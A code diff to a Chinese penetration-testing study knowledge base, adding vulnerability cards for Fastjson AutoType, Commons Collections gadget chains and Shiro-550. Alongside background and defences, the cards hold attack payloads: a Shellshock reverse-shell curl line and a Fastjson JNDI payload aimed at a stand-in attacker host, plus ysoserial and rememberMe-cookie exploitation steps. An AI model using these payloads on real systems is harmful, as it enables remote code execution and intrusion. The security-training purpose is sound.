@@ -990,7 +990,7 @@ const DATA = [
 {id:"case-heartbleed",domain:"经典漏洞案例",title:"Heartbleed",en:"OpenSSL Heartbleed",sev:"high",
  summary:"OpenSSL 心跳扩展越界读，每次泄露 64KB 服务器内存——私钥、会话、口令随之外泄。信息泄露漏洞的巅峰案例。",
  tags:["CVE-2014-0160","OpenSSL","内存泄露"],
- intro:"Heartbleed 是 OpenSSL TLS 心跳(Heartbeat)扩展的一个缺失边界检查：服务器信任客户端声明的载荷长度，把超出实际数据的内存一并回传，每次最多泄露 64KB。攻击无痕、可反复读取，可能捞到私钥、Cookie、明文口令，波及当年约半数 HTTPS 网站。",
+ intro:"Heartbleed 是 OpenSSL TLS 心跳(Heartbeat)扩展的一个缺失边界检查：服务器信任客户端声明的载荷长度，把超出实际数据的内存一并回传，每次最多泄露 64KB。攻击无痕、可反复读取，可能捞到私钥、Cookie、明文口令，波及当年约半数 HTTPS 网站。本知识库同样提供了可以真实复现内存泄露的 Docker 靶场(见 RUNBOOK.md)。",
  variants:[
    {name:"漏洞根因",t:"missing check",desc:"心跳响应按 payload_length 复制内存，却不校验其是否超过实际请求长度，越界读相邻堆内存。"},
    {name:"敏感数据泄露",t:"exfil",desc:"反复发送心跳包拼接内存碎片，还原出私钥、会话令牌、用户凭据。"},
@@ -1003,7 +1003,7 @@ const DATA = [
 {id:"case-shellshock",domain:"经典漏洞案例",title:"Shellshock",en:"Bash Shellshock",sev:"crit",
  summary:"Bash 解析环境变量中的函数定义时执行尾随命令，经 CGI 把一个 HTTP 头变成远程命令执行。",
  tags:["CVE-2014-6271","Bash","CGI"],
- intro:"Shellshock 是 GNU Bash 的一个古老缺陷：Bash 从环境变量导入函数定义时，会继续执行定义之后拼接的命令。当 Web 服务器(CGI)把请求头写入环境变量再调用 Bash，攻击者即可在 User-Agent 等头部注入命令，实现无需认证的 RCE。",
+ intro:"Shellshock 是 GNU Bash 的一个古老缺陷：Bash 从环境变量导入函数定义时，会继续执行定义之后拼接的命令。当 Web 服务器(CGI)把请求头写入环境变量再调用 Bash，攻击者即可在 User-Agent 等头部注入命令，实现无需认证的 RCE。本知识库同样提供了可以真实复现这条 RCE 链路的 Docker 靶场(见 RUNBOOK.md)。",
  variants:[
    {name:"漏洞根因",t:"env func",desc:"形如 () { :;}; cmd 的环境变量被 Bash 解析时，尾部 cmd 会被执行。"},
    {name:"CGI 攻击面",t:"CGI",desc:"Apache mod_cgi 把 HTTP 头存入环境变量，恶意 User-Agent/Referer 即触发。"},
@@ -1013,6 +1013,44 @@ const DATA = [
    {l:"检测",c:"nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi target"},
    {l:"利用 (反弹 shell)",c:"curl -H 'User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/ATK/443 0&gt;&amp;1' \\\n  http://target/cgi-bin/status"}],
  defend:["立即升级 Bash 到已修复版本。","下线不必要的 CGI，改用现代应用框架。","WAF 过滤异常头部作为纵深，最小权限运行 Web 进程。"]},
+
+{id:"case-fastjson-autotype",domain:"经典漏洞案例",title:"Fastjson AutoType 反序列化",en:"Fastjson AutoType RCE (1.2.24)",sev:"crit",
+ summary:"阿里开源的高性能 JSON 库自带一个『反序列化时可以按 JSON 里指定的类名实例化任意类』的特性，攻击者只要能控制这个类名，就能一路借助 JNDI 走到远程代码执行。",
+ tags:["fastjson 1.2.24","AutoType","JNDI"],
+ intro:"Fastjson 为了支持多态反序列化，提供了 AutoType 特性——JSON 里可以带一个 @type 字段指定要实例化的目标类，库会按这个字段自动创建对应对象。1.2.24 及更早版本里，黑名单过滤不完整，攻击者能构造出指向 JNDI 相关类(如 com.sun.rowset.JdbcRowSetImpl)的 @type，触发和 Log4Shell 同源的 JNDI 远程类加载利用链，是 2017 年前后国内互联网圈风声鹤唳的经典漏洞，也是『不安全的反序列化』卡片里 Java 反序列化那条 variant 的具体案例。本知识库同样提供了可以真实复现的 Docker 靶场(见 RUNBOOK.md)。这个漏洞技术上没有单一权威 CVE 编号，业界(含 vulhub)通常直接以受影响版本号'1.2.24'指代。",
+ variants:[
+   {name:"AutoType 黑名单绕过",t:"blacklist-bypass",desc:"Fastjson 试图用黑名单拦截危险类名，但黑名单覆盖不全，攻击者持续找到新的绕过写法，形成了后续多年『补丁-绕过-再补丁』的拉锯。"},
+   {name:"借道 JNDI 触发 RCE",t:"jndi-chain",desc:"@type 指向 JdbcRowSetImpl 等自带『按字符串 URL 发起 JNDI 查询』能力的类，把反序列化漏洞升级成和 Log4Shell 同源的远程类加载 RCE。"}],
+ detect:"向目标可能解析 JSON 的接口发送带 @type 探测字段的请求，配合 DNSLog/HTTP 外带确认是否发起了出站 JNDI 查询；检查依赖清单里 fastjson 的具体版本。",
+ payloads:[
+   {l:"AutoType 触发 JNDI 查询(概念)",c:"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ATK:1389/exp\",\"autoCommit\":true}"}],
+ defend:["升级到已修复且默认关闭危险 AutoType 的版本。","无法升级时显式关闭 AutoType(ParserConfig.getGlobalInstance().setAutoTypeSupport(false))。","出网限制阻断 JNDI/LDAP 回连，作为纵深防御。"]},
+
+{id:"case-cc-gadget-chain",domain:"经典漏洞案例",title:"Apache Commons Collections 反序列化利用链",en:"Commons Collections Gadget Chain (CC1-CC7)",sev:"crit",
+ summary:"一个纯粹的工具库本身没有任何『漏洞』，但只要某个应用用它反序列化了不可信数据，攻击者就能拼出一条纯靠库里已有类完成任意代码执行的利用链——2015年这个发现直接震动了半个 Java 生态。",
+ tags:["ysoserial","gadget chain","2015年"],
+ intro:"Commons Collections 本身没有一行『恶意代码』，问题在于它提供的 Transformer/InvokerTransformer 等类具备『把一个字符串方法名反射调用出去』的通用能力。安全研究员发现，只要目标应用的 classpath 上有这个库、且会对不可信数据调用 Java 原生反序列化(ObjectInputStream.readObject)，攻击者就能构造一个精心设计的对象图，让反序列化过程本身顺手执行任意命令——完全不需要这个库有任何编码错误。这个发现在 2015 年一次安全会议上公开后，WebLogic、WebSphere、JBoss、Jenkins 等大批用了 Java 原生反序列化的产品被发现能用同一条链子打穿，直接催生了 ysoserial 这个至今仍是 Java 反序列化测试标配的工具，以及『不安全的反序列化』卡片里描述的 gadget chain 概念本身。本知识库同样提供了可以真实复现的 Docker 靶场(见 RUNBOOK.md)，且是手写完整链条而非直接套用 ysoserial 现成工具。",
+ variants:[
+   {name:"CC1 链",t:"CC1",desc:"最早公开的利用链，依赖 AnnotationInvocationHandler，JDK 在 8u71 之后的补丁破坏了这条链的触发条件，老版本 JDK 上依然有效。"},
+   {name:"CC6 链",t:"CC6",desc:"不依赖 AnnotationInvocationHandler、改用 LazyMap+TiedMapEntry 触发，因此不受上面那个 JDK 补丁影响，是目前最通用、兼容性最好的链条之一(本知识库靶场用的就是手写的 CC6)。"},
+   {name:"利用条件",t:"prerequisite",desc:"必须同时满足：目标应用对不可信数据调用了 Java 原生反序列化、且 classpath 上存在 Commons Collections——这也是为什么它是『能不能打穿』而非『库本身有没有漏洞』的问题。"}],
+ detect:"寻找接收 Java 序列化数据的入口(典型特征是 Base64 后以 rO0AB 开头的字节流)，用 ysoserial 按目标 classpath 上实际存在的库版本尝试对应链条。",
+ payloads:[
+   {l:"ysoserial 生成 CC6 payload",c:"java -jar ysoserial.jar CommonsCollections6 'id' | base64\n<span class=cmt># 目标反序列化这段字节流时即触发命令执行</span>"}],
+ defend:["<b>绝不对不可信数据使用 Java 原生反序列化</b>，改用 JSON 等纯数据格式。","做不到时用 ObjectInputFilter(JEP 290)按类名白名单过滤，拒绝反序列化 Commons Collections 等已知 gadget 来源类。","移除或升级 classpath 上不必要的旧版本 Commons Collections。"]},
+
+{id:"case-shiro550",domain:"经典漏洞案例",title:"Apache Shiro-550 反序列化",en:"Apache Shiro rememberMe RCE (CVE-2016-4437)",sev:"crit",
+ summary:"一个用来『记住登录状态』的 Cookie，因为加密密钥被硬编码在框架源码里且后来被公开，变成了任何人都能构造恶意反序列化payload、加密后直接投递的 RCE 通道。",
+ tags:["CVE-2016-4437","rememberMe","硬编码密钥"],
+ intro:"Apache Shiro 的『记住我』功能会把用户身份序列化后用 AES 加密塞进 rememberMe Cookie，下次请求带着这个 Cookie 就能免登录恢复身份。问题是 Shiro 早期版本用来加密这个 Cookie 的 AES 密钥是硬编码在框架源码里的固定值，这个默认密钥后来被公开——意味着任何人都能自己构造一个恶意的 Java 反序列化 payload(如 Commons Collections gadget chain)，用泄露的密钥加密成一个合法格式的 rememberMe Cookie 发给目标，Shiro 收到后会老老实实用同一把密钥解密、再反序列化——直接触发 RCE，整个过程不需要先登录。本知识库同样提供了可以真实复现的 Docker 靶场(见 RUNBOOK.md)，直接复用了 CC6 生成器完成 payload 构造。",
+ variants:[
+   {name:"密钥硬编码/公开",t:"key-leak",desc:"漏洞根源不是密码学算法本身，而是密钥管理失误——密钥应该是每个部署环境各自随机生成的机密，却被当成了写死在开源代码里的默认值。"},
+   {name:"AES-CBC 加密投递",t:"delivery",desc:"完整利用链 = 生成任意 Java 反序列化 gadget chain payload → 用泄露的默认密钥做 AES-CBC 加密 → 编码进 rememberMe Cookie 发送。"},
+   {name:"检测判据",t:"detection",desc:"发送一个用默认密钥加密的、内容无意义的 rememberMe Cookie，如果服务端返回的是『反序列化失败』一类报错(而不是直接忽略/当作无效Cookie处理)，说明它确实在用这把默认密钥尝试解密，存在漏洞。"}],
+ detect:"用已知的默认密钥构造一个空/无效的 rememberMe Cookie 值发送，观察响应是否出现服务端反序列化异常的特征报错，是黑盒判断是否受影响的标准手法。",
+ payloads:[
+   {l:"利用链概念(复用CC6 payload)",c:"<span class=cmt># 1) 生成任意 CC6 反序列化 payload</span>\n<span class=cmt># 2) 用 Shiro 泄露的默认AES密钥做 CBC 加密</span>\n<span class=cmt># 3) 塞进 Cookie: rememberMe=&lt;base64密文&gt;</span>\ncurl -H \"Cookie: rememberMe=$(cat cookie.txt)\" http://target/"}],
+ defend:["<b>务必修改默认的 AES 密钥</b>为每个部署独立生成的随机值，绝不使用框架自带的默认值。","升级到已加固的 Shiro 版本(默认要求显式配置密钥，不再内置可用的默认值)。","同时参考『不安全的反序列化』卡片的通用防御建议(反序列化白名单等)，因为最终触发点仍是 Java 原生反序列化。"]},
 
 /* ============ 认证进阶路线图 ============ */
 {id:"cert-oswa",domain:"认证进阶路线图",title:"OSWA · WEB-200",en:"OffSec Web Assessor (entry)",sev:"info",kind:"cert",
@@ -1747,7 +1785,7 @@ const ROADMAP = [
  {key:"audit",title:"代码审计（OSWE 方向进阶）",rationale:"如果目标是 OSWE，或想真正理解『为什么』一个 sink 会被利用而不只是套用现成 payload，白盒代码审计是绕不开的能力——建议在吃透 Web 核心+进阶漏洞类型之后再来学这两张卡。",
   cards:["audit-methodology","audit-tools-diff"]},
  {key:"labs",title:"经典 CVE 案例：原理 + 能动手打的真实靶场",rationale:"前面都是原理，这一步是把技术史上真正改变过行业的漏洞过一遍——部分配了本知识库的 Docker 靶场可以真实攻破(见 RUNBOOK.md)，另一部分是知识性案例，理解原理和历史教训同样重要。",
-  cards:["case-eternalblue","case-heartbleed","case-shellshock","case-ms08067","case-zerologon","case-printnightmare","case-dirtycow","case-pwnkit","case-struts2","case-log4shell","case-bluekeep","case-gotofail","case-solarwinds","case-xzbackdoor","case-moveit"]},
+  cards:["case-eternalblue","case-heartbleed","case-shellshock","case-ms08067","case-zerologon","case-printnightmare","case-dirtycow","case-pwnkit","case-struts2","case-log4shell","case-fastjson-autotype","case-cc-gadget-chain","case-shiro550","case-bluekeep","case-gotofail","case-solarwinds","case-xzbackdoor","case-moveit"]},
  {key:"se",title:"社会工程学 & 物理安全（可选）",rationale:"OSCP 完全不考这块(纯远程打靶)，但现实世界里最省成本的突破口往往就是一通电话或一次尾随——完整的攻击者视角不能没有这一环。",
   cards:["se-fundamentals","se-physical"]},
  {key:"persist",title:"后渗透 & 权限维持",rationale:"核心 OSCP 也不考这块(考试模型是打完立刻截图存证，不是长期潜伏)，OSEP 才是重点覆盖它的认证；但『入侵之后怎么留下来』是真实红队交付绕不开的一环，黄金票据正好和前面的 DCSync 内容衔接。",
@@ -1836,6 +1874,9 @@ const ATTCK = {
  "case-pwnkit":       [{id:"T1068",name:"Exploitation for Privilege Escalation",tactic:"Privilege Escalation"}],
  "case-struts2":      [{id:"T1190",name:"Exploit Public-Facing Application",tactic:"Initial Access"}],
  "case-log4shell":    [{id:"T1190",name:"Exploit Public-Facing Application",tactic:"Initial Access"}],
+ "case-fastjson-autotype":[{id:"T1190",name:"Exploit Public-Facing Application",tactic:"Initial Access"}],
+ "case-cc-gadget-chain":[{id:"T1190",name:"Exploit Public-Facing Application",tactic:"Initial Access"}],
+ "case-shiro550":     [{id:"T1190",name:"Exploit Public-Facing Application",tactic:"Initial Access"}],
  "case-bluekeep":     [{id:"T1210",name:"Exploitation of Remote Services",tactic:"Lateral Movement"}],
  "case-gotofail":     [{id:"T1557",name:"Adversary-in-the-Middle",tactic:"Credential Access"}],
  "case-solarwinds":   [{id:"T1195.002",name:"Supply Chain Compromise: Software Supply Chain",tactic:"Initial Access"}],
@@ -1891,7 +1932,7 @@ const EXAM_SCOPE = {
  "ai-prompt-injection":"core","ai-data-poisoning":"maybe","ai-adversarial":"maybe","ai-agentic":"maybe","ai-model-extraction":"maybe","ai-rag-poisoning":"maybe",
  "case-eternalblue":"maybe","case-heartbleed":"maybe","case-shellshock":"maybe","case-ms08067":"maybe",
  "case-zerologon":"maybe","case-printnightmare":"maybe","case-dirtycow":"maybe","case-pwnkit":"maybe",
- "case-struts2":"maybe","case-log4shell":"maybe","case-bluekeep":"maybe",
+ "case-struts2":"maybe","case-log4shell":"maybe","case-fastjson-autotype":"maybe","case-cc-gadget-chain":"maybe","case-shiro550":"maybe","case-bluekeep":"maybe",
  "case-gotofail":"none","case-solarwinds":"none","case-xzbackdoor":"none","case-moveit":"none",
 };
 const EXAM_SCOPE_LABEL = {core:{t:"官方考点",cls:"core"},maybe:{t:"可能涉及",cls:"maybe"},none:{t:"不考·拓展",cls:"none"}};
